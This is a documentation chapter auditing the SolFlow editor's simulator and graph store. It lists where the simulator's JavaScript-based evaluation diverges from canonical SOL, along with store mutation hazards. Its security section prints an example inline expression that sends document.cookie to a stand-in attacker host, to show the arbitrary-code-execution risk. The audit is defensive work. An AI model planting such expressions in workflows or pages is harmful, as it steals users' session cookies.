# 23 — Editor Runtime Audit

> **Status:** Substantive (commit 11). Audits the SolFlow editor's
> *own* runtime — the in-browser simulator, the graph store's
> mutation surface, undo/redo / autosave, and the serialization
> path — against canonical SOL semantics. Surfaces the points
> where the simulator hides real compiler bugs from users, and
> where the editor's data model lets the user silently corrupt
> graph state.

The editor runs an in-browser SOL interpreter (`src/runtime/interpret.ts`)
so users can test workflows without a backend. It is **not** a
bytecode VM — it walks the graph directly and evaluates
expressions via JavaScript's `Function` constructor. This means
the simulator and the canonical SOL VM disagree about a number of
behaviors that *look identical* but produce different results
under specific inputs.

Anywhere the disagreement happens, users see one behavior in the
editor and another in production. Several of the canonical SOL
bugs documented in chapter 21 are *invisible in the simulator*
because the simulator implements the correct behavior. Others go
the opposite way.

This chapter is the editor-side companion to chapter 22 (Cross-
Layer Assumptions). It catalogues every known divergence and the
mutation hazards in the store surface.

---

## 23.1 Simulator architecture in one paragraph

`src/runtime/interpret.ts:run(workflow, hooks, opts)` walks the
workflow graph. It locates an entry node (a trigger node if
specified, else the first trigger in `start`, else the literal
`start` node), creates a fresh JavaScript object as the scope
(`Object.create(null)`), and calls `walkChain` which follows
`control` edges between statement-form nodes. Each statement
executes by reading its data inputs via `resolveDataInput` — which
checks inline expressions first (evaluated via
`new Function(...names, "return (${jsExpr});")`) and falls back to
walking wired data edges. The interpreter throws Rust-style
sentinel exceptions (`ReturnSignal`, `RuntimeError`) for control
flow and errors.

The simulator records a trace of `{enter, exit, edge, value, error}`
events; the simulation store (`src/stores/simulation.store.ts`)
animates the trace at human pace over the canvas. **Playback does
not re-execute the interpreter** — the trace is data; the canvas
animation is purely visual.

---

## 23.2 Inline expressions are evaluated as JavaScript

The single largest divergence. `evalInline`
(`src/runtime/interpret.ts:690–709`):

```ts
function evalInline(ctx, scope, expr) {
    const jsExpr = expr.replace(
        /\b([A-Z][A-Za-z0-9_]*)::([A-Z][A-Za-z0-9_]*)/g,
        '"$1::$2"',
    );
    const names = Object.keys(scope);
    const values = names.map((n) => scope[n]);
    const f = new Function(...names, `return (${jsExpr});`);
    return f(...values);
}
```

The only SOL-to-JS translation is `E::V` → `"E::V"` (string
literal). Everything else is interpreted as JavaScript:

| SOL inline expression | What the simulator runs | What canonical SOL does |
|---|---|---|
| `a + b` | JS `a + b` — coerces, concatenates strings | Per-operator type rules (chapter 08); `str + str` rejected |
| `a == b` | JS `===` via the `eq` helper | Per-type comparison; struct/array compare by ref |
| `payload.amount.toFixed(2)` | JS method call → succeeds | Parse error — no method syntax |
| `arr.length` | JS array length | Parse error — no `.length` on arrays (chapter 11 §11.7) |
| `Math.floor(x)` | JS — but `Math` isn't in scope → `ReferenceError` | Parse error — no `Math` |
| `"hello" + name` | JS — concatenates | Analyzer rejects (E1006) |
| `typeof x` | JS — works | Lexer error: `typeof` is unknown |
| `(x + 1) * 2` | JS — works | SOL — works (compatible syntax) |
| `x.y.z` | JS — works (dotted access) | SOL — works (chained `ExprMemAcc`) |
| `[1, 2, 3]` | JS — array literal | SOL — array literal |
| `'a' + 'b'` | JS — `"ab"` | SOL — `'a'`/`'b'` are chars, `+` rejected |

**Recommendation for tooling:** Treat the simulator as a
*JavaScript-flavored approximation of SOL*. Programs that depend
on subtle semantics — integer vs float division, string
concatenation, type coercion at boundaries — will exhibit
different behavior between the simulator and canonical SOL.

Logged as **T9022**.

---

## 23.3 Per-operation divergences

### Division

```ts
case '/': {
    const denom = num(b);
    if (denom === 0) throw new RuntimeError('division by zero');
    return num(a) / denom;
}
```

`num(a) / num(b)` is JavaScript division — always returns a
double. In the simulator, `5 / 2 = 2.5`. In canonical SOL,
`IntDiv` does i64 truncating division: `5 / 2 = 2`. Programs that
depend on integer division produce different results in the two
environments.

The division-by-zero check happens on the denominator only.
Float `0 / 0` returns `NaN` (since `num(0)/num(0)` would compute
`0/0` in JS, but only after the explicit zero check — actually
wait, the check fires for `denom === 0` so `0 / 0` does throw.
But `0 / 0.0` after `num` coercion is still `0` integer so also
throws). Inconsistent with canonical SOL's IEEE-754 float
division (which produces `NaN` silently).

Logged as **T9024**.

### `+` for strings

```ts
case '+': return numOrConcat(a, b, (x, y) => x + y);

function numOrConcat(a, b, f) {
    if (typeof a === 'string' || typeof b === 'string') {
        return String(a) + String(b);
    }
    return f(num(a), num(b));
}
```

If either operand is a string, the simulator concatenates. So
`"hello" + " world"` returns `"hello world"`, `"x:" + 42`
returns `"x:42"`, `1 + "2"` returns `"12"`. **All four are
analyzer errors in canonical SOL** (E1006 `mismatched types in
arithmetic` or `not supported for type`).

This means: a workflow that works in the simulator may fail at
compile time. The author thinks they have working string
concatenation; the deploy fails.

Logged as **T9023**.

### `==` and enum identity

```ts
function eq(a, b) {
    if (a === b) return true;
    if (typeof a === 'string' && typeof b === 'string') {
        const norm = (s) => s.replace(/\([^)]*\)$/, '');
        return norm(a) === norm(b);
    }
    return false;
}
```

Enum variants are represented as strings of the form
`"E::V"` or `"E::V(N)"` (where N is the parser's iota value).
The `norm` strips the `(N)` suffix so wired enum-variant nodes
(which carry the iota) compare equal to inline-typed `E::V`
references (which don't).

**This is the simulator implementing the *intended* enum
semantics — by name.** Canonical SOL's bytecode uses
`first_char % 10` (T9002), so two variants like
`Status::Active` and `Status::Aborted` collide at runtime. The
simulator does NOT collide them; the editor user sees their
program run correctly.

**Consequence:** the simulator silently hides T9002 from
authors. A program that runs cleanly in the simulator can
silently misbehave in production.

Logged as **T9026**.

### `toBool` is JS-style

```ts
function toBool(v) {
    if (typeof v === 'boolean') return v;
    if (typeof v === 'number') return v !== 0;
    if (typeof v === 'string') return v.length > 0 && v !== 'false';
    return Boolean(v);
}
```

Accepts strings, numbers, booleans, and even objects/arrays
(any truthy/falsy JS value). Canonical SOL's `if`/`while`
conditions must be `bool` (E1003). A simulator-passing program
like `if score { ... }` (where `score` is an `int`) fails to
compile.

Logged as **T9025**.

### `num` coercion is JS-permissive

```ts
function num(v) {
    if (typeof v === 'number') return v;
    if (typeof v === 'boolean') return v ? 1 : 0;
    if (typeof v === 'string' && !isNaN(Number(v))) return Number(v);
    throw new RuntimeError(`expected number, got ${typeof v}`);
}
```

`num("42")` returns `42`. `num(true)` returns `1`. Canonical SOL
has no such coercions; both would be type errors.

---

## 23.4 Scope model — flat per function

The simulator's scope is a single `Record<string, unknown>` per
function call:

```ts
const scope: Scope = Object.create(null);
fn.params.forEach((p, i) => {
    scope[p.name] = args[i];
});
```

There is **no block-level scoping**. Every `let` inside a function
body writes to the same flat object. Two `let`s with the same
name in different blocks both overwrite the same scope key.

```sol
fn start() -> int {
    let x: int = 5;
    if true {
        let x: int = 10;       # analyzer: redefinition of x
    }
    return x;
}
```

The canonical analyzer **rejects** this with E1002 (`error:
redefinition of x` in the same scope — because canonical block
scoping creates a new scope for the `if` body, and same-scope
duplicates are rejected). The simulator silently allows it: the
two `let x` writes both go to the same scope; the second
overwrites the first; `return x` returns `10`.

Worse, the inverse pattern fails *in the simulator* even though
canonical SOL accepts it:

```sol
fn start() -> int {
    if true { let inner: int = 5; }
    return inner;     # canonical: variable `inner` could not be found
}
```

Canonical SOL: `inner` is in the if-body block's scope, not the
function's outer scope. The `return inner;` triggers E1001.
Simulator: `inner` is in the flat per-function scope, so the
return works and yields `5`. **Direct opposite results.**

Logged as **T9027**.

---

## 23.5 Variable resolution — four different models

A summary table of how each layer resolves a variable reference:

| Layer | Model | What it accepts |
|---|---|---|
| Editor validator (`variableResolves`) | Walks every node in the function looking for a `let` or `forEach` with matching name | Any name declared anywhere in the function, regardless of control-flow reachability or block nesting |
| Simulator (`scope: Record<string, unknown>`) | Flat per-function map | Any name in scope as of the most-recent `let` / `assign` (overwrites previous) |
| Canonical analyzer (`tts: Vec<TypeTableId>`) | Nested block-scope stack | Names declared in this block or any ancestor block (lexical scope) |
| Canonical codegen (`Codegen.locals: HashMap`) | Per-function flat slot map, reset on each `DeclFunc` | Names visible via slot offset relative to fp; ignores nested block boundaries |

**None of the four models exactly agree.** The validator and
simulator allow more than the analyzer (no block scoping). The
analyzer enforces block scoping. The codegen sometimes
accidentally agrees with the analyzer (because of the per-function
reset) but creates fresh slots for unknown names via
`find_local_offset` (T9014 mechanism).

This is the **single most divergent area** between the editor
and canonical SOL. A program that runs in the simulator may fail
to compile, or vice versa.

---

## 23.6 Statement-level divergences

### `print` accepts any number of args (no T9003 in simulator)

```ts
case 'print': {
    const value = resolveDataInput(ctx, fn, scope, node, 'value');
    ctx.output.push(formatValue(value));
    // ... no looping over additional args
}
```

The simulator's `print` node has exactly one `value` port (per
the editor's node schema), so multi-arg print isn't reachable
from the editor. **T9003 is invisible in the simulator** because
the editor model prevents multi-arg print. If a user hand-emits
SOL with `print(a, b, c)` outside the editor, canonical SOL drops
b and c at the bytecode level.

### `forEach` accepts JS arrays only

```ts
case 'forEach': {
    const arr = resolveDataInput(ctx, fn, scope, node, 'array');
    if (!Array.isArray(arr)) {
        throw new RuntimeError(`for-each: not an array — got ${typeof arr}`);
    }
    ...
}
```

The simulator's `forEach` requires a JS array (`Array.isArray`).
Canonical SOL's `for-in` requires `Type::Array`. These are
roughly equivalent today but a future SOL feature (like
`for-in` over a struct or over an iterator) would diverge.

### Trigger nodes are simulator-only

Triggers don't exist in canonical SOL (chapter 18 §18.2 — they
emit as `// @trigger` comments, T9001). The simulator handles
them as first-class entry points: when `entryTriggerId` is
specified, the simulator starts from that trigger, parses its
`samplePayload` as JSON, and binds it to the trigger's `payload`
data-out port.

A workflow that uses triggers cannot be canonically run —
canonical SOL doesn't know about them. The editor's "Simulate
Event" button is the only way to exercise triggers; canonical SOL
ignores them entirely.

### `ext function` is not simulator-able

The simulator's `call` op looks up the target in
`ctx.workflow.functions`:

```ts
case 'call': {
    const callee = ctx.workflow.functions.find((f) => f.id === data.functionId);
    if (!callee) {
        throw new RuntimeError(`call: target function not found`);
    }
    ...
}
```

The editor's schema doesn't model `ext function` declarations at
all — they're a Phase B / runtime concept. So a workflow that
calls an external function cannot be simulated. The simulator
throws `target function not found`.

**Recommendation:** Sol Man generation should add a mock/stub for
any `ext` call when generating workflows intended for simulator
testing. The editor's "Apply as new workflow" + "Run" path
breaks for ext-heavy workflows.

Logged as **T9031**.

---

## 23.7 Runtime safety limits — simulator only

```ts
const MAX_STEPS = 100_000;
const MAX_CALL_DEPTH = 1000;
const MAX_DURATION_MS = 60_000;
```

The simulator throws `RuntimeError` if any limit is hit. The
canonical SOL VM has **none** of these limits — it runs until
the program terminates or panics.

Consequence: a recursive function with depth 1500 fails in the
simulator (`Maximum call depth 1000 exceeded`) but runs fine in
canonical SOL (until the host's Rust stack overflows, much
later). A tight loop running 200,000 iterations fails in the
simulator (`Step limit exceeded`) but runs fine in canonical SOL.

The simulator's limits are defensive against tab-freezing; they
do not represent language semantics.

Logged as **T9030**.

---

## 23.8 Security: `new Function` arbitrary JS execution

```ts
const f = new Function(...names, `return (${jsExpr});`);
return f(...values);
```

The simulator constructs and executes a JavaScript function from
the inline expression string. **This is arbitrary code execution
in the user's browser.**

A malicious workflow with inline expression like:

```text
fetch('https://attacker.example/' + document.cookie)
```

would silently exfiltrate cookies the first time the user clicks
"Run" in the editor. The simulator does not sandbox the
`Function` evaluation, does not block global access (`document`,
`fetch`, `localStorage`, `eval`, etc.), and does not limit network
calls.

This matters because:

- Workflows can be loaded from arbitrary JSON (e.g. a user
  imports a `.workflow.json` shared by someone else).
- Sol Man fetches workflows from an LLM — a prompt-injection in
  the LLM's input could produce a malicious workflow.
- The editor has no user-visible warning about inline expression
  contents.

**Recommendation:** Future versions of the simulator should
either (a) parse and evaluate inline expressions as SOL through a
purpose-built expression evaluator, or (b) sandbox the `Function`
call in a Web Worker with `globalThis` shadowed.

Logged as **T9029**. Severity: high for any workflow loaded from
an untrusted source.

---

## 23.9 Graph-state mutation hazards

### `updateFunctionSignature` leaves dangling arg edges

When a function's signature changes (a parameter is renamed),
the store rebuilds the ports on every call-node referencing it
(`graph.store.ts:152–170`):

```ts
for (const node of otherFn.nodes) {
    if (node.data.kind === 'call' && node.data.functionId === id) {
        node.ports = rebuildPorts(node.data, ctx.value);
    }
}
```

But it does **not** call `rebuildAllPorts()` — which means any
existing edges still reference the *old* port ids (`arg:<old-name>`).
After the rename, those edges point at port ids that no longer
exist on the call node. The validator catches this via the
missing-input check on the *new* port (`arg:<new-name>`) which
has no incoming edge, but the dangling edge itself is silently
left in the graph.

Symptom: validator fires `missing input arg:<new-name>` for
every renamed parameter. The user might add the new wire; the
old dangling edge stays. Visual clutter; no functional
corruption.

Logged as **T9032**.

### `rebuildAllPorts` silently drops dangling edges

```ts
fn.edges = fn.edges.filter((e) => {
    const src = fn.nodes.find((n) => n.id === e.source.node);
    const tgt = fn.nodes.find((n) => n.id === e.target.node);
    if (!src || !tgt) return false;
    return (
        src.ports.out.some((p) => p.id === e.source.port) &&
        tgt.ports.in.some((p) => p.id === e.target.port)
    );
});
```

Called by `loadWorkflow`. Any edge whose endpoint port no longer
exists on its node is removed without a warning. If a workflow
is loaded with renamed struct fields (so `field:foo` no longer
exists), the edges that wired into those fields are silently
dropped. The user loses wiring they may have spent time creating.

A safer alternative: collect dropped edges and surface them as
warnings.

Logged as **T9033**.

### `loadWorkflow` performs no schema validation

```ts
function loadWorkflow(wf: SolWorkflow) {
    workflow.value = wf;
    activeFunctionId.value = wf.functions[0]?.id ?? '';
    rebuildAllPorts();
    touch();
}
```

The TypeScript signature claims `SolWorkflow` but the function
doesn't validate the input. `bootstrap()` checks
`parsed.schemaVersion === 1 && parsed.functions?.length` — but
`loadWorkflow` skips even that.

If a caller passes a malformed object (missing `imports`,
missing `meta`, `functions` with wrong-shaped nodes), the store
accepts it. Downstream `validateWorkflow`, `emit`, the
interpreter, the Inspector, and the canvas may all crash on
unexpected shapes.

Recommendation: route every `loadWorkflow` call through a
validation step that checks `schemaVersion`, the presence of
`imports`/`structs`/`enums`/`functions` arrays, and basic
per-node shape.

Logged as **T9034**.

### Undo/redo race window

```ts
isReplaying = true;
historyIndex--;
workflow.value = parsed;
...
setTimeout(() => { isReplaying = false; }, 0);
```

The `isReplaying` flag is a single boolean. The autosave +
history-snapshot debounces (600ms / 220ms) check this flag to
skip recording during replay. If the user mashes undo / redo
quickly, multiple `setTimeout(0)` callbacks queue up; the order
of execution depends on the event loop, and a snapshot can
sometimes fire before the next replay's `isReplaying = true`
guard.

The store does cancel any in-flight `historyTimer` at the top of
undo/redo (`graph.store.ts:957–959`), which mitigates the most
common race — but doesn't eliminate it entirely under rapid
keyboard mashing.

Symptom: occasionally a redo "loses" because a new snapshot got
pushed during the replay window, truncating the redo stack.

Logged as **T9035**. Severity: low (rare, mostly cosmetic).

### Autosave debounce can lose recent changes

```ts
saveTimer = window.setTimeout(() => {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(workflow.value));
}, 600);
```

The 600ms debounce means changes made within 600ms of the user
closing the tab are not persisted. The history snapshot debounce
is 220ms.

Recommendation: a `beforeunload` listener that flushes the
pending save synchronously would close this window. The current
code has no such listener.

Logged as **T9036**.

---

## 23.10 Serialization invariants

The store uses `JSON.stringify(workflow.value)` for both autosave
and undo-stack snapshots. This relies on a few invariants:

| Invariant | Today? | If violated |
|---|---|---|
| All workflow values are JSON-serializable (no `Map`, `Set`, `undefined`, `Function`, `Symbol`, circular refs) | Yes — `SolWorkflow` is plain objects, arrays, strings, numbers, booleans | A future schema addition with `Map`/`Set` would silently drop those fields on snapshot |
| `node.expressions` is `Record<string, string>` (round-trips cleanly) | Yes | n/a |
| Numeric values don't lose precision (e.g. very large floats) | Mostly — `JSON.stringify` preserves `f64` precision via printable form | Edge case: `Number.MAX_SAFE_INTEGER + 1` and similar lose 1-ulp precision |
| Node `id` values survive intact | Yes — strings | n/a |

The `schemaVersion: 1` field is the canonical break-on-upgrade
marker. Any future schema change must bump this version, and
`bootstrap()` should refuse to load mismatched versions instead
of silently accepting them.

**Today, `bootstrap()` accepts only `schemaVersion === 1`**
(`graph.store.ts:102`). A workflow saved with a future version
silently fails the check and the autosave is discarded — at
least the user gets an empty workflow rather than a corrupted
one.

---

## 23.11 Node-ID and reference integrity

Every node and edge carries a `nanoid(8)` identifier
(`src/graph/factory.ts:382`). The store maintains these via:

- `addNode`: generates a fresh nanoid via `createNode`.
- `duplicateNode`: deep-clones data + ports + expressions and
  generates a fresh nanoid.
- `insertSnapshot`: an id-map remaps every node + edge id during
  the paste.
- `loadWorkflow`: accepts the workflow's ids as-is.

Two integrity concerns:

1. **Cross-function reference of node ids is undefined.** Edges
   reference `node.id` but the store never validates that the
   target node lives in the same function. The schema permits
   only intra-function edges, and the interpreter walks
   `fn.edges` (per function), so the constraint is implicit.
   A `loadWorkflow` with cross-function edges would silently
   load them; they would be no-ops at runtime (because no
   function's `walkChain` would see them).
2. **Duplicate ids within a function.** Nothing prevents two
   nodes from sharing the same id. The store's
   `fn.nodes.find((n) => n.id === id)` returns the first match;
   any state attached to subsequent matches is unreachable. The
   `nanoid(8)` collision probability is negligible (≈ 1 in 5×10¹⁰
   per pair), but `loadWorkflow` accepts user-provided ids
   without checking.

Neither is exploited in the current corpus; both are latent
risks for tools that construct workflows out-of-band.

---

## 23.12 Determinism

The simulator's execution is **deterministic given identical
input**. Specifically:

| Input | Determinism |
|---|---|
| Same workflow + same trigger payload + no `Math.random` in inline expressions | **Deterministic** |
| Same workflow + `Math.random()` in an inline expression | **Non-deterministic** — JS `Math.random()` is fresh per call |
| Same workflow + `Date.now()` in an inline expression | **Non-deterministic** — time-dependent |
| Same workflow + inline expression that reads from `localStorage` / `document.cookie` | **Non-deterministic + security risk** (T9029) |

Canonical SOL is deterministic by construction — no `random`, no
clock, no I/O beyond `print` and `ext function` calls. The
simulator's determinism depends entirely on the inline
expressions not reaching into the JS host environment.

**For reproducible simulator runs, restrict inline expressions
to bare variable references, dotted field access, indexed
access, arithmetic, comparisons, and logical/bitwise operators.
Disallow any identifier the analyzer wouldn't recognize.**

---

## 23.13 Ordering assumptions — async / `ext` boundary

The simulator is synchronous — every walk completes in one
`run()` call. There is no async surface; `ext function` cannot
be simulated (T9031); trigger handlers run inline.

Canonical SOL is also synchronous at the language level (no
async / await / promises). But `ExtCall` is a blocking HTTP
round-trip (chapter 12 §12.4) that can take seconds or longer.
The host runtime is single-threaded per session, so the program
"blocks" the session until the response arrives.

**Programs that interleave multiple `ext` calls expect them to
execute in source order** — which both the simulator (synchronously)
and canonical SOL (sequential HTTP) honor. There is no parallel
`ext` execution. If a future SOL feature introduces async, this
chapter must be revisited.

---

## 23.14 Summary classification (chapter-21 badges)

| Editor behavior | Badge | Cross-ref |
|---|---|---|
| Inline expression as JavaScript (T9022) | **Current-impl** | §23.2 |
| `+` does string concat (T9023) | **Current-impl** divergence | §23.3 |
| `/` does float division (T9024) | **Current-impl** divergence | §23.3 |
| `toBool` accepts non-bool (T9025) | **Current-impl** divergence | §23.3 |
| Enum comparison by name normalizes (T9026) | **Current-impl** — *hides* T9002 from users | §23.3 |
| Flat per-function scope (T9027) | **Current-impl** divergence | §23.4 |
| Undefined variable throws (T9028) | **Current-impl** — *catches* what T9014 hides | §23.4 |
| Arbitrary JS via `new Function` (T9029) | **Undefined** — security hazard | §23.8 |
| Step/depth/duration limits (T9030) | **Current-impl** — simulator-only | §23.7 |
| No `ext function` simulation (T9031) | **Current-impl** — feature gap | §23.6 |
| `updateFunctionSignature` leaves dangling edges (T9032) | **Current-impl** — UX bug | §23.9 |
| `rebuildAllPorts` silent edge drop (T9033) | **Current-impl** — silent data loss | §23.9 |
| `loadWorkflow` no schema validation (T9034) | **Current-impl** — defense gap | §23.9 |
| Undo/redo race window (T9035) | **Current-impl** — rare | §23.9 |
| Autosave debounce loses changes (T9036) | **Current-impl** — UX hazard | §23.9 |

---

## 23.15 Where Sol Man can accidentally generate dangerous behavior categories

Cross-referenced from chapter 19 §19.8 and re-classified by the
chapter-21 taxonomy of stability badges, but specifically asking
"what *behavior categories* does Sol Man widen?"

| Generation pattern | Behavior category widened |
|---|---|
| Top-level `let` | **Undefined** behavior at runtime (T9014) |
| Colliding enum first chars | **Accidental** correctness — looks right in simulator; wrong in production |
| Multi-arg `print` (not directly reachable from editor model) | **Current-impl bug** silent data loss |
| Non-SOL inline expressions | **Current-impl** — simulator runs them as JS; canonical fails |
| Inline expressions that read `Math` / `Date` / `document` | **Undefined** + security risk |
| Misspelled types (`string`, `any`, `int32`) | **Accidental** — compiles; field access later fails |
| Empty struct literals | **Current-impl** — silent zero-fill |
| Cross-enum comparisons | **Specified** — compile error |
| Built-in name shadowing | **Current-impl** — silent dispatch to wrong handler |
| Apply-anyway with empty ports | **Emergent** — parse error or silent no-op |

The most important class of new findings: **generated workflows
that pass simulator testing but fail in canonical SOL**, and
**generated workflows that run in canonical SOL but produce
different observable behavior than the simulator showed**. The
simulator is not a faithful preview of canonical SOL behavior.

Sol Man's generation guidance should explicitly warn the LLM
about each of these. The validator can catch some structural
patterns; the simulator's "looks right" answer is not a guarantee
of canonical correctness.

---

## 23.16 Implications for future tooling

A short list of design directions this audit suggests:

- **Replace `new Function` with a real SOL expression evaluator.**
  Eliminates the security hazard (T9029) and removes most of
  §23.3's divergences in one shot. The new evaluator would
  honor SOL's type rules; programs that pass simulator testing
  would behave the same in canonical SOL.
- **Add block scoping to the simulator.** Mirror canonical SOL's
  nested-scope model. Same-name `let`s in same block become
  errors; same-name `let`s across blocks become independent
  bindings. Aligns simulator semantics with the analyzer's.
- **Sandbox the simulator** in a Web Worker with a shadowed
  `globalThis`. Even before replacing `new Function`, this
  contains the blast radius of malicious inline expressions.
- **Schema-validate `loadWorkflow` input.** Add a JSON-schema
  check (or a hand-written validator) that the input matches
  `SolWorkflow`. Reject malformed workflows at the boundary
  rather than letting them corrupt the store.
- **Make `rebuildAllPorts` surface dropped edges.** Return the
  dropped-edge list to the caller; let the UI show a toast
  ("3 edges removed because their target ports no longer
  exist").
- **A `beforeunload` flush** for the 600ms autosave debounce
  closes the change-loss window.
- **`updateFunctionSignature` should call `rebuildAllPorts`** to
  clean up dangling edges proactively.
- **An "untrusted workflow" mode** that refuses to simulate
  workflows whose inline expressions contain JS-specific syntax
  (`Math`, `Date`, `document`, `window`, `globalThis`, method
  calls, `typeof`, etc.). Treat them as analyzer-rejected before
  simulation begins.

These are out-of-scope for the current docs but worth naming so
the audit can guide the next editor refactor.

---

## 23.17 Sources cited in this chapter

- `src/runtime/interpret.ts` (full file, 755 lines)
- `src/runtime/simulate.ts` (full file, 52 lines)
- `src/stores/graph.store.ts` (full file, 1066 lines — mutation,
  undo/redo, autosave, serialization)
- `src/stores/simulation.store.ts` (top 170 lines — playback)
- All T9xxx entries in [`ERROR_REFERENCE.md`](./ERROR_REFERENCE.md)
- Cross-references: chapters 06, 10, 14, 18, 19, 20, 21, 22
